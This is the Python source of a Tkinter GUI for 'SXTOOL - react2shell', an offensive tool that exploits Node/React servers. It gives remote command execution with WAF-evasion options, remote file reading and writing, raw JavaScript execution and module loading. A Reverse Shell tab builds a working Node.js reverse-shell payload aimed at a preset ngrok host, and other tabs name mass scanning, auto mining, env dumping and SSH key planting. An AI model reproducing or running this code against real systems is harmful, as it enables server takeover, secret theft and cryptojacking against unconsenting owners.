"""GUI window for SXTOOL - react2shell."""
import os
import re
import sys
import threading
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from pathlib import Path
from typing import List

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.exploit import CVEExploit
from core.types import RemoteFile
from core.scanner import parse_target_list
from utils import security


class FileViewerWindow:
    """Window for viewing file contents."""
    
    def __init__(self, parent, filename: str, content: str, file_path: str = None, 
                 exploit_instance=None, target_url: str = None, endpoint: str = None,
                 unicode_waf: bool = False, utf16_waf: bool = False, aes: bool = False,
                 payload_type: str = None):
        self.window = tk.Toplevel(parent)
        self.window.title(f"File Viewer: {filename}")
        self.window.geometry("900x700")
        
        self.filename = filename
        self.file_path = file_path
        self.exploit = exploit_instance
        self.target_url = target_url
        self.endpoint = endpoint
        self.unicode_waf = unicode_waf
        self.utf16_waf = utf16_waf
        self.aes = aes
        self.payload_type = payload_type
        self.is_binary = False
        self.is_readonly = False
        
        # Check if binary
        data = content.encode('utf-8') if isinstance(content, str) else content
        check_len = min(len(data), 512)
        if check_len > 0:
            self.is_binary = b'\x00' in data[:check_len]
        
        # Button frame at top
        button_frame = ttk.Frame(self.window)
        button_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Save button (only for non-binary files with save capability)
        self.save_btn = None
        if not self.is_binary and self.exploit and self.file_path:
            save_btn = ttk.Button(button_frame, text="💾 Save File", command=self._save_file)
            save_btn.pack(side=tk.LEFT, padx=5)
            self.save_btn = save_btn
        else:
            if self.is_binary:
                info_label = ttk.Label(button_frame, text="⚠️ File biner tidak dapat diedit", foreground="orange")
                info_label.pack(side=tk.LEFT, padx=5)
                self.is_readonly = True
            elif not self.exploit or not self.file_path:
                info_label = ttk.Label(button_frame, text="⚠️ Mode read-only", foreground="gray")
                info_label.pack(side=tk.LEFT, padx=5)
                self.is_readonly = True
        
        # Status label
        self.status_label = ttk.Label(button_frame, text="", foreground="green")
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        self.text_widget = scrolledtext.ScrolledText(
            self.window,
            wrap=tk.NONE,
            font=('Consolas', 10) if sys.platform == 'win32' else ('Monospace', 10)
        )
        self.text_widget.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        if self.is_binary:
            limit = 8192
            if len(data) > limit:
                hex_view = self._hex_dump(data[:limit])
                view = f"Terdeteksi file biner (ukuran total: {len(data)} bytes).\n{limit} bytes pertama (Hex view):\n\n{hex_view}\n...(truncated)"
            else:
                hex_view = self._hex_dump(data)
                view = f"Terdeteksi file biner (ukuran total: {len(data)} bytes):\n\n{hex_view}"
            self.text_widget.insert('1.0', view)
            self.text_widget.config(state=tk.DISABLED)
        else:
            # For text files, make editable if we have save capability
            if len(content) > 500000:
                self.text_widget.insert('1.0', content[:500000] + "\n\n...(teks terlalu panjang, ditampilkan terpotong)...")
                # If truncated, make readonly
                self.text_widget.config(state=tk.DISABLED)
                self.is_readonly = True
                if self.save_btn:
                    self.save_btn.config(state=tk.DISABLED)
            else:
                self.text_widget.insert('1.0', content)
                # Keep editable if we can save (not readonly)
                if self.is_readonly:
                    self.text_widget.config(state=tk.DISABLED)
    
    def _save_file(self):
        """Save edited file content to remote server."""
        if not self.exploit or not self.file_path:
            messagebox.showerror("Error", "Tidak dapat menyimpan: informasi server tidak tersedia", parent=self.window)
            return
        
        if self.is_binary or self.is_readonly:
            messagebox.showerror("Error", "File ini tidak dapat disunting", parent=self.window)
            return
        
        # Get edited content
        edited_content = self.text_widget.get('1.0', tk.END)
        # Remove trailing newline from get operation
        if edited_content.endswith('\n'):
            edited_content = edited_content[:-1]
        
        # Confirm save
        if not messagebox.askyesno("Konfirmasi", f"Yakin ingin menyimpan perubahan ke:\n{self.file_path}?", parent=self.window):
            return
        
        # Disable save button during save
        self.save_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Menyimpan...", foreground="blue")
        self.window.update()
        
        def save():
            try:
                result = self.exploit.write_file(
                    self.target_url,
                    self.endpoint,
                    self.file_path,
                    edited_content,
                    self.unicode_waf,
                    self.utf16_waf,
                    self.aes,
                    self.payload_type
                )
                self.window.after(0, lambda: self.status_label.config(text="✅ Berhasil disimpan!", foreground="green"))
                # Re-enable save button after 2 seconds
                self.window.after(2000, lambda: self.save_btn.config(state=tk.NORMAL))
            except Exception as e:
                self.window.after(0, lambda: self.status_label.config(text="❌ Gagal menyimpan", foreground="red"))
                self.window.after(0, lambda: messagebox.showerror("Error", f"Gagal menyimpan file:\n{str(e)}", parent=self.window))
                self.window.after(0, lambda: self.save_btn.config(state=tk.NORMAL))
        
        threading.Thread(target=save, daemon=True).start()
    
    def _hex_dump(self, data: bytes) -> str:
        """Generate hex dump of binary data."""
        lines = []
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hex_part = ' '.join(f'{b:02x}' for b in chunk)
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            lines.append(f'{i:08x}  {hex_part:<48}  |{ascii_part}|')
        return '\n'.join(lines)


class MainWindow:
    """Main application window."""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SXTOOL - react2shell")
        self.root.geometry("900x700")  # More compact default size
        
        # Create exploit instance
        self.exploit = CVEExploit(timeout=30, verify_ssl=False)
        
        # Current path for file manager
        self.current_path = "/"
        self.file_list_data: list[RemoteFile] = []
        
        self._create_widgets()
    
    def _create_widgets(self):
        """Create and layout all widgets."""
        # Config frame - more compact
        config_frame = ttk.LabelFrame(self.root, text="Konfigurasi Dasar", padding=5)
        config_frame.pack(fill=tk.X, padx=3, pady=3)
        
        # Target URL
        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, pady=1)
        self.target_entry = ttk.Entry(config_frame, width=50)
        self.target_entry.insert(0, "http://example.com:3000")
        self.target_entry.grid(row=0, column=1, columnspan=2, sticky=tk.EW, pady=1)
        
        # Endpoint
        ttk.Label(config_frame, text="API Endpoint:").grid(row=1, column=0, sticky=tk.W, pady=1)
        self.endpoint_entry = ttk.Entry(config_frame, width=50)
        self.endpoint_entry.insert(0, "/")
        self.endpoint_entry.grid(row=1, column=1, columnspan=2, sticky=tk.EW, pady=1)
        
        # Payload type
        ttk.Label(config_frame, text="Payload Type:").grid(row=2, column=0, sticky=tk.W, pady=1)
        self.payload_type_var = tk.StringVar(value="Array Map Chain")
        payload_combo = ttk.Combobox(config_frame, textvariable=self.payload_type_var, 
                                     values=["Prototype Chain", "Array Map Chain"], state="readonly", width=47)
        payload_combo.grid(row=2, column=1, columnspan=2, sticky=tk.EW, pady=1)
        
        # Timeout
        timeout_label = ttk.Label(config_frame, text="Timeout (detik):")
        timeout_label.grid(row=3, column=0, sticky=tk.W, pady=1)
        timeout_frame = ttk.Frame(config_frame)
        timeout_frame.grid(row=3, column=1, columnspan=2, sticky=tk.EW, pady=1)
        self.timeout_var = tk.StringVar(value="30")
        timeout_entry = ttk.Entry(timeout_frame, textvariable=self.timeout_var, width=10)
        timeout_entry.pack(side=tk.LEFT, padx=(0, 5))
        timeout_entry.bind('<KeyRelease>', self._on_timeout_change)
        # Tooltip hint - more compact
        timeout_hint = ttk.Label(timeout_frame, text="(30-60s normal, 120s+ berat)", 
                                font=('TkDefaultFont', 7), foreground='gray')
        timeout_hint.pack(side=tk.LEFT)
        
        # Options frame - more compact layout
        options_frame = ttk.Frame(config_frame)
        options_frame.grid(row=4, column=0, columnspan=3, sticky=tk.EW, pady=2)
        
        # Proxy - compact layout
        self.proxy_check_var = tk.BooleanVar()
        proxy_check = ttk.Checkbutton(options_frame, text="Proxy", variable=self.proxy_check_var,
                                     command=self._toggle_proxy)
        proxy_check.grid(row=0, column=0, sticky=tk.W, padx=2)
        
        self.proxy_entry = ttk.Entry(options_frame, width=18)
        self.proxy_entry.insert(0, "127.0.0.1:8080")
        self.proxy_entry.config(state=tk.DISABLED)
        self.proxy_entry.grid(row=0, column=1, padx=2, sticky=tk.W)
        
        # WAF options - compact layout
        self.unicode_waf_var = tk.BooleanVar(value=True)
        unicode_check = ttk.Checkbutton(options_frame, text="Unicode", variable=self.unicode_waf_var)
        unicode_check.grid(row=0, column=2, padx=2, sticky=tk.W)
        
        self.utf16_waf_var = tk.BooleanVar()
        utf16_check = ttk.Checkbutton(options_frame, text="UTF-16LE", variable=self.utf16_waf_var)
        utf16_check.grid(row=0, column=3, padx=2, sticky=tk.W)
        
        self.aes_var = tk.BooleanVar()
        aes_check = ttk.Checkbutton(options_frame, text="AES", variable=self.aes_var)
        aes_check.grid(row=0, column=4, padx=2, sticky=tk.W)
        
        config_frame.columnconfigure(1, weight=1)
        
        # Notebook (Tabs) - more compact
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=3, pady=3)
        
        # Tab 1: Command Execution - more compact
        rce_frame = ttk.Frame(notebook, padding=5)
        notebook.add(rce_frame, text="Eksekusi Perintah")
        
        self._create_rce_tab(rce_frame)
        
        # Tab 2: File Manager - more compact
        file_frame = ttk.Frame(notebook, padding=5)
        notebook.add(file_frame, text="File Manager")
        
        self._create_file_manager_tab(file_frame)
        
        # Tab 3: Advanced - more compact
        adv_frame = ttk.Frame(notebook, padding=5)
        notebook.add(adv_frame, text="Eksploitasi Lanjutan")
        
        self._create_advanced_tab(adv_frame)
        
        # Tab 4: Mass Scan - more compact
        scan_frame = ttk.Frame(notebook, padding=5)
        notebook.add(scan_frame, text="Mass Scan")
        
        self._create_mass_scan_tab(scan_frame)
        
        # Tab 5: Reverse Shell - more compact
        revshell_frame = ttk.Frame(notebook, padding=5)
        notebook.add(revshell_frame, text="Reverse Shell")
        
        self._create_reverse_shell_tab(revshell_frame)
        
        # Tab 6: Auto Mine - more compact
        mine_frame = ttk.Frame(notebook, padding=5)
        notebook.add(mine_frame, text="Auto Mine")
        
        self._create_auto_mine_tab(mine_frame)
        
        # Tab 7: Env Dumper - more compact
        env_frame = ttk.Frame(notebook, padding=5)
        notebook.add(env_frame, text="Env Dumper")
        
        self._create_env_dumper_tab(env_frame)
        
        # Tab 8: Auto Add SSH - more compact
        ssh_frame = ttk.Frame(notebook, padding=5)
        notebook.add(ssh_frame, text="Auto Add SSH")
        
        self._create_auto_ssh_tab(ssh_frame)
        
        # Tab 9: Url Extractor - more compact
        extractor_frame = ttk.Frame(notebook, padding=5)
        notebook.add(extractor_frame, text="Url Extractor")
        
        self._create_url_extractor_tab(extractor_frame)
    
    def _create_rce_tab(self, parent):
        """Create Command Execution tab."""
        # Command input
        cmd_frame = ttk.Frame(parent)
        cmd_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(cmd_frame, text="Perintah Sistem:").pack(anchor=tk.W)
        
        cmd_input_frame = ttk.Frame(cmd_frame)
        cmd_input_frame.pack(fill=tk.X, pady=5)
        
        # Quick commands
        quick_cmds = ["whoami", "id", "ls -la", "cat /etc/passwd", "env", "pwd"]
        quick_cmd_var = tk.StringVar()
        quick_combo = ttk.Combobox(cmd_input_frame, textvariable=quick_cmd_var,
                                   values=quick_cmds, state="readonly", width=20)
        quick_combo.pack(side=tk.LEFT, padx=5)
        quick_combo.bind('<<ComboboxSelected>>', 
                        lambda e: self.cmd_entry.delete(0, tk.END) or self.cmd_entry.insert(0, quick_cmd_var.get()))
        
        # Execution mode
        self.exec_mode_var = tk.StringVar(value="Sinkron (execSync - ada output)")
        exec_mode_combo = ttk.Combobox(cmd_input_frame, textvariable=self.exec_mode_var,
                                       values=["Sinkron (execSync - ada output)", "Async (exec - tanpa output)"],
                                       state="readonly", width=25)
        exec_mode_combo.pack(side=tk.LEFT, padx=5)
        
        self.cmd_entry = ttk.Entry(cmd_input_frame)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.cmd_entry.insert(0, "whoami")
        # Bind Enter key to execute command
        self.cmd_entry.bind('<Return>', lambda e: self._execute_command())
        
        run_btn = ttk.Button(cmd_input_frame, text="Eksekusi Perintah", command=self._execute_command)
        run_btn.pack(side=tk.LEFT, padx=5)
        
        # Output
        ttk.Label(parent, text="Output:").pack(anchor=tk.W, pady=(10, 5))
        self.cmd_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            font=('Consolas', 10) if sys.platform == 'win32' else ('Monospace', 10),
            height=15
        )
        self.cmd_output.pack(fill=tk.BOTH, expand=True)
    
    def _create_file_manager_tab(self, parent):
        """Create File Manager tab."""
        # Path navigation
        path_frame = ttk.Frame(parent)
        path_frame.pack(fill=tk.X, pady=5)
        
        self.up_btn = ttk.Button(path_frame, text="↑", width=3, command=self._go_up_directory)
        self.up_btn.pack(side=tk.LEFT, padx=2)
        
        ttk.Label(path_frame, text="Path:").pack(side=tk.LEFT, padx=5)
        
        self.path_entry = ttk.Entry(path_frame)
        self.path_entry.insert(0, "/")
        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.path_entry.bind('<Return>', lambda e: self._refresh_file_list())
        
        go_btn = ttk.Button(path_frame, text="→", width=3, command=self._refresh_file_list)
        go_btn.pack(side=tk.LEFT, padx=2)
        
        # File list
        ttk.Label(parent, text="File & Direktori:").pack(anchor=tk.W, pady=(10, 5))
        
        list_frame = ttk.Frame(parent)
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Treeview for file list
        tree_frame = ttk.Frame(list_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(tree_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.file_tree = ttk.Treeview(tree_frame, columns=("size",), show="tree headings", 
                                      yscrollcommand=scrollbar.set, height=15)
        self.file_tree.heading("#0", text="Nama")
        self.file_tree.heading("size", text="Ukuran")
        self.file_tree.column("size", width=100)
        self.file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.file_tree.yview)
        
        self.file_tree.bind('<Double-1>', self._on_file_double_click)
        
        # Write file section
        write_frame = ttk.LabelFrame(parent, text="Tulis File ke Direktori Saat Ini", padding=10)
        write_frame.pack(fill=tk.X, pady=(10, 0))
        
        write_name_frame = ttk.Frame(write_frame)
        write_name_frame.pack(fill=tk.X, pady=2)
        ttk.Label(write_name_frame, text="Nama File:").pack(side=tk.LEFT)
        self.write_name_entry = ttk.Entry(write_name_frame)
        self.write_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        self.write_content_text = scrolledtext.ScrolledText(write_frame, height=5, wrap=tk.WORD)
        self.write_content_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        write_btn = ttk.Button(write_frame, text="Tulis File", command=self._write_file)
        write_btn.pack(pady=5)
    
    def _create_advanced_tab(self, parent):
        """Create Advanced Exploitation tab."""
        # Module loading
        mod_frame = ttk.LabelFrame(parent, text="Load Module", padding=10)
        mod_frame.pack(fill=tk.X, pady=5)
        
        mod_input_frame = ttk.Frame(mod_frame)
        mod_input_frame.pack(fill=tk.X)
        
        ttk.Label(mod_input_frame, text="Path Module:").pack(side=tk.LEFT, padx=5)
        self.mod_path_entry = ttk.Entry(mod_input_frame)
        self.mod_path_entry.insert(0, "/tmp/shell.js (perlu diupload dulu)")
        self.mod_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        load_mod_btn = ttk.Button(mod_input_frame, text="Load Module (module._load)", 
                                 command=self._load_module)
        load_mod_btn.pack(side=tk.LEFT, padx=5)
        
        # JS execution
        js_frame = ttk.LabelFrame(parent, text="Eksekusi JS Native", padding=10)
        js_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.js_entry = scrolledtext.ScrolledText(js_frame, height=6, wrap=tk.WORD,
                                                  font=('Consolas', 10) if sys.platform == 'win32' else ('Monospace', 10))
        self.js_entry.pack(fill=tk.BOTH, expand=True, pady=5)
        self.js_entry.insert('1.0', "process.env")
        
        run_js_btn = ttk.Button(js_frame, text="Eksekusi JS Native", command=self._execute_js)
        run_js_btn.pack(pady=5)
        
        # Output
        ttk.Label(parent, text="Hasil Eksekusi:").pack(anchor=tk.W, pady=(10, 5))
        self.adv_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            font=('Consolas', 10) if sys.platform == 'win32' else ('Monospace', 10),
            height=10
        )
        self.adv_output.pack(fill=tk.BOTH, expand=True)
    
    def _toggle_proxy(self):
        """Toggle proxy entry enabled state."""
        if self.proxy_check_var.get():
            self.proxy_entry.config(state=tk.NORMAL)
        else:
            self.proxy_entry.config(state=tk.DISABLED)
    
    def _toggle_multithread(self):
        """Toggle threads and batch size entry enabled state."""
        if self.scan_multithread_var.get():
            self.scan_threads_entry.config(state=tk.NORMAL)
            self.scan_batch_size_entry.config(state=tk.NORMAL)
        else:
            self.scan_threads_entry.config(state=tk.DISABLED)
            self.scan_batch_size_entry.config(state=tk.DISABLED)
    
    def _toggle_multiple_commands(self):
        """Toggle multiple commands input visibility."""
        if self.scan_multiple_cmds_var.get():
            self.scan_multiple_cmds_text.config(state=tk.NORMAL)
            self.scan_multiple_cmds_text.pack(fill=tk.X, pady=2)
        else:
            self.scan_multiple_cmds_text.config(state=tk.DISABLED)
            self.scan_multiple_cmds_text.pack_forget()
    
    def _on_timeout_change(self, event=None):
        """Update timeout when user changes the value."""
        try:
            timeout = int(self.timeout_var.get())
            if timeout > 0:
                self.exploit.update_timeout(timeout)
        except ValueError:
            # Invalid input, ignore
            pass
    
    def _preflight_check(self) -> bool:
        """Perform pre-flight checks before operations."""
        if not self.target_entry.get().strip():
            messagebox.showerror("Error", "Masukkan Target URL", parent=self.root)
            return False
        
        if not security.check_security(self.target_entry.get(), self.root):
            return False
        
        # Update timeout
        try:
            timeout = int(self.timeout_var.get())
            if timeout > 0:
                self.exploit.update_timeout(timeout)
            else:
                messagebox.showerror("Error", "Timeout harus lebih besar dari 0", parent=self.root)
                return False
        except ValueError:
            messagebox.showerror("Error", "Timeout harus berupa angka", parent=self.root)
            return False
        
        proxy_error = self.exploit.update_proxy(
            self.proxy_check_var.get(),
            self.proxy_entry.get()
        )
        if proxy_error:
            messagebox.showerror("Error", f"Pengaturan proxy salah: {proxy_error}", parent=self.root)
            return False
        
        return True
    
    def _execute_command(self):
        """Execute system command."""
        if not self._preflight_check():
            return
        
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        is_async = "Async" in self.exec_mode_var.get()
        p_type = self.payload_type_var.get()
        
        current_timeout = self.exploit.timeout
        self.cmd_output.delete('1.0', tk.END)
        self.cmd_output.insert('1.0', f"Sedang mengeksekusi... (timeout: {current_timeout}s)")
        
        def execute():
            try:
                res = self.exploit.execute_command_auto(
                    self.target_entry.get(),
                    self.endpoint_entry.get(),
                    cmd,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    is_async,
                    p_type
                )
                self.cmd_output.delete('1.0', tk.END)
                if is_async:
                    self.cmd_output.insert('1.0', "Eksekusi berhasil (mode async):\nPerintah telah dikirim ke background.")
                else:
                    self.cmd_output.insert('1.0', res)
            except Exception as e:
                self.cmd_output.delete('1.0', tk.END)
                self.cmd_output.insert('1.0', f"Eksekusi gagal: {str(e)}")
        
        threading.Thread(target=execute, daemon=True).start()
    
    def _refresh_file_list(self):
        """Refresh file list for current directory."""
        if not self._preflight_check():
            return
        
        path = self.path_entry.get().strip()
        p_type = self.payload_type_var.get()
        
        # Clear and show loading
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)
        self.file_tree.insert("", tk.END, text="Loading...", values=("",))
        
        def list_files():
            try:
                files = self.exploit.list_files(
                    self.target_entry.get(),
                    self.endpoint_entry.get(),
                    path,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    p_type
                )
                
                # Clear tree
                for item in self.file_tree.get_children():
                    self.file_tree.delete(item)
                
                # Populate tree
                for file in files:
                    icon = "📁" if file.is_dir else "📄"
                    size_str = f"{file.size} bytes" if file.size >= 0 else "N/A"
                    self.file_tree.insert("", tk.END, text=f"{icon} {file.name}", 
                                         values=(size_str,), tags=("dir" if file.is_dir else "file",))
                
                self.file_list_data = files
                self.current_path = path
                
            except Exception as e:
                for item in self.file_tree.get_children():
                    self.file_tree.delete(item)
                messagebox.showerror("Error", str(e), parent=self.root)
        
        threading.Thread(target=list_files, daemon=True).start()
    
    def _go_up_directory(self):
        """Navigate to parent directory."""
        current = self.path_entry.get().strip()
        if current == "/":
            return
        
        # Simple path parent logic
        if current.endswith("/"):
            current = current.rstrip("/")
        
        parts = current.split("/")
        if len(parts) > 1:
            new_path = "/".join(parts[:-1]) if parts[:-1] else "/"
        else:
            new_path = "/"
        
        self.path_entry.delete(0, tk.END)
        self.path_entry.insert(0, new_path)
        self._refresh_file_list()
    
    def _on_file_double_click(self, event):
        """Handle double-click on file list item."""
        selection = self.file_tree.selection()
        if not selection:
            return
        
        item = selection[0]
        index = self.file_tree.index(item)
        
        if index >= len(self.file_list_data):
            return
        
        file = self.file_list_data[index]
        
        if file.is_dir:
            new_path = os.path.join(self.current_path, file.name).replace("\\", "/")
            if not new_path.startswith("/"):
                new_path = "/" + new_path
            self.path_entry.delete(0, tk.END)
            self.path_entry.insert(0, new_path)
            self._refresh_file_list()
        else:
            full_path = os.path.join(self.current_path, file.name).replace("\\", "/")
            if not full_path.startswith("/"):
                full_path = "/" + full_path
            
            if messagebox.askyesno("Baca File", f"Yakin ingin membaca {file.name}?"):
                def read_file():
                    try:
                        content = self.exploit.read_file(
                            self.target_entry.get(),
                            self.endpoint_entry.get(),
                            full_path,
                            self.unicode_waf_var.get(),
                            self.utf16_waf_var.get(),
                            self.aes_var.get(),
                            self.payload_type_var.get()
                        )
                        FileViewerWindow(
                            self.root, 
                            file.name, 
                            content,
                            file_path=full_path,
                            exploit_instance=self.exploit,
                            target_url=self.target_entry.get(),
                            endpoint=self.endpoint_entry.get(),
                            unicode_waf=self.unicode_waf_var.get(),
                            utf16_waf=self.utf16_waf_var.get(),
                            aes=self.aes_var.get(),
                            payload_type=self.payload_type_var.get()
                        )
                    except Exception as e:
                        messagebox.showerror("Error", str(e), parent=self.root)
                
                threading.Thread(target=read_file, daemon=True).start()
    
    def _write_file(self):
        """Write file to remote server."""
        if not self._preflight_check():
            return
        
        filename = self.write_name_entry.get().strip()
        if not filename:
            return
        
        content = self.write_content_text.get('1.0', tk.END).rstrip('\n')
        p_type = self.payload_type_var.get()
        
        full_path = os.path.join(self.path_entry.get().strip(), filename).replace("\\", "/")
        if not full_path.startswith("/"):
            full_path = "/" + full_path
        
        if messagebox.askyesno("Peringatan", f"Akan menimpa: {full_path}"):
            def write():
                try:
                    res = self.exploit.write_file(
                        self.target_entry.get(),
                        self.endpoint_entry.get(),
                        full_path,
                        content,
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        p_type
                    )
                    messagebox.showinfo("Sukses", res, parent=self.root)
                    self._refresh_file_list()
                except Exception as e:
                    messagebox.showerror("Error", str(e), parent=self.root)
            
            threading.Thread(target=write, daemon=True).start()
    
    def _load_module(self):
        """Load Node.js module."""
        if not self._preflight_check():
            return
        
        mod_path = self.mod_path_entry.get().strip()
        if not mod_path:
            return
        
        p_type = self.payload_type_var.get()
        
        self.adv_output.delete('1.0', tk.END)
        self.adv_output.insert('1.0', "Mencoba memuat module...")
        
        def load():
            try:
                res = self.exploit.load_module(
                    self.target_entry.get(),
                    self.endpoint_entry.get(),
                    mod_path,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    p_type
                )
                self.adv_output.delete('1.0', tk.END)
                self.adv_output.insert('1.0', f"Hasil pemuatan:\n{res}")
            except Exception as e:
                self.adv_output.delete('1.0', tk.END)
                self.adv_output.insert('1.0', f"Error: {str(e)}")
        
        threading.Thread(target=load, daemon=True).start()
    
    def _execute_js(self):
        """Execute raw JavaScript code."""
        if not self._preflight_check():
            return
        
        code = self.js_entry.get('1.0', tk.END).strip()
        if not code:
            return
        
        p_type = self.payload_type_var.get()
        
        self.adv_output.delete('1.0', tk.END)
        self.adv_output.insert('1.0', "Menjalankan JS...")
        
        def execute():
            try:
                res = self.exploit.execute_js_raw(
                    self.target_entry.get(),
                    self.endpoint_entry.get(),
                    code,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    p_type
                )
                self.adv_output.delete('1.0', tk.END)
                self.adv_output.insert('1.0', res)
            except Exception as e:
                self.adv_output.delete('1.0', tk.END)
                self.adv_output.insert('1.0', f"Error: {str(e)}")
        
        threading.Thread(target=execute, daemon=True).start()
    
    def _create_reverse_shell_tab(self, parent):
        """Create Reverse Shell tab."""
        # Instructions
        info_frame = ttk.LabelFrame(parent, text="Instruksi", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        
        info_text = "Masukkan host dan port untuk reverse shell. Pastikan listener sudah aktif di host tersebut."
        ttk.Label(info_frame, text=info_text, font=('TkDefaultFont', 9), 
                 foreground='gray', wraplength=600).pack(anchor=tk.W)
        
        # Connection settings
        conn_frame = ttk.LabelFrame(parent, text="Koneksi", padding=5)
        conn_frame.pack(fill=tk.X, pady=5)
        
        # Host input
        host_frame = ttk.Frame(conn_frame)
        host_frame.pack(fill=tk.X, pady=2)
        ttk.Label(host_frame, text="Host:").pack(side=tk.LEFT, padx=5)
        self.revshell_host_entry = ttk.Entry(host_frame, width=40)
        self.revshell_host_entry.insert(0, "0.tcp.ap.ngrok.io")
        self.revshell_host_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Port input
        port_frame = ttk.Frame(conn_frame)
        port_frame.pack(fill=tk.X, pady=2)
        ttk.Label(port_frame, text="Port:").pack(side=tk.LEFT, padx=5)
        self.revshell_port_entry = ttk.Entry(port_frame, width=10)
        self.revshell_port_entry.insert(0, "18800")
        self.revshell_port_entry.pack(side=tk.LEFT, padx=5)
        
        # OS selection
        os_frame = ttk.Frame(conn_frame)
        os_frame.pack(fill=tk.X, pady=2)
        ttk.Label(os_frame, text="OS:").pack(side=tk.LEFT, padx=5)
        self.revshell_os_var = tk.StringVar(value="Linux")
        os_combo = ttk.Combobox(os_frame, textvariable=self.revshell_os_var, 
                               values=["Linux", "Windows"], state="readonly", width=15)
        os_combo.pack(side=tk.LEFT, padx=5)
        
        # Execute button
        exec_frame = ttk.Frame(conn_frame)
        exec_frame.pack(fill=tk.X, pady=5)
        revshell_btn = ttk.Button(exec_frame, text="Jalankan Reverse Shell", 
                                command=self._execute_reverse_shell)
        revshell_btn.pack(pady=5)
        
        # Output
        ttk.Label(parent, text="Hasil:").pack(anchor=tk.W, pady=(10, 5))
        self.revshell_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            font=('Consolas', 10) if sys.platform == 'win32' else ('Monospace', 10),
            height=8
        )
        self.revshell_output.pack(fill=tk.BOTH, expand=True)
    
    def _execute_reverse_shell(self):
        """Execute reverse shell with specified host and port."""
        if not self._preflight_check():
            return
        
        host = self.revshell_host_entry.get().strip()
        port_str = self.revshell_port_entry.get().strip()
        os_type = self.revshell_os_var.get()
        
        if not host:
            messagebox.showerror("Error", "Masukkan host untuk reverse shell", parent=self.root)
            return
        
        if not port_str:
            messagebox.showerror("Error", "Masukkan port untuk reverse shell", parent=self.root)
            return
        
        try:
            port = int(port_str)
            if port < 1 or port > 65535:
                raise ValueError("Port harus antara 1-65535")
        except ValueError as e:
            messagebox.showerror("Error", f"Port tidak valid: {e}", parent=self.root)
            return
        
        # Generate reverse shell script based on OS
        if os_type == "Linux":
            code = f"""(function(){{
    try {{
        var net = process.mainModule.require('net');
        var cp = process.mainModule.require('child_process');
        var sh = cp.spawn('/bin/sh', ['-i']);
        var client = new net.Socket();
        
        client.on('error', function(err) {{
            if (sh) sh.kill(); 
        }});
        
        sh.on('error', function(err) {{
            if (client) client.destroy();
        }});
        
        client.connect({port}, '{host}', function(){{
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        }});
        
        return "Reverse shell spawned successfully (Linux) - Connecting to {host}:{port}";
    }} catch (e) {{
        return "Failed to spawn: " + e.message;
    }}
}})();"""
        else:  # Windows
            code = f"""(function(){{
    try {{
        var net = process.mainModule.require('net');
        var cp = process.mainModule.require('child_process');
        var sh = cp.spawn('cmd.exe', []);
        var client = new net.Socket();
        
        client.on('error', function(err) {{
            if (sh) sh.kill(); 
        }});
        
        sh.on('error', function(err) {{
            if (client) client.destroy();
        }});
        
        client.connect({port}, '{host}', function(){{
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        }});
        
        return "Reverse shell spawned successfully (Windows) - Connecting to {host}:{port}";
    }} catch (e) {{
        return "Failed to spawn: " + e.message;
    }}
}})();"""
        
        self.revshell_output.delete('1.0', tk.END)
        self.revshell_output.insert('1.0', f"Menjalankan reverse shell ke {host}:{port} ({os_type})...")
        
        def execute():
            try:
                res = self.exploit.execute_js_raw(
                    self.target_entry.get(),
                    self.endpoint_entry.get(),
                    code,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    self.payload_type_var.get()
                )
                self.root.after(0, lambda: self.revshell_output.delete('1.0', tk.END))
                self.root.after(0, lambda: self.revshell_output.insert('1.0', res))
            except Exception as e:
                self.root.after(0, lambda: self.revshell_output.delete('1.0', tk.END))
                self.root.after(0, lambda: self.revshell_output.insert('1.0', f"Error: {str(e)}"))
        
        threading.Thread(target=execute, daemon=True).start()
    
    def _parse_mine_targets(self, targets_text: str) -> List[str]:
        """Parse target list - extract URL only from each line, handling format like:
        http://host:port [whoami - user] [pwd - /path]
        https://host.com [whoami - user] [pwd - /path]
        """
        import re
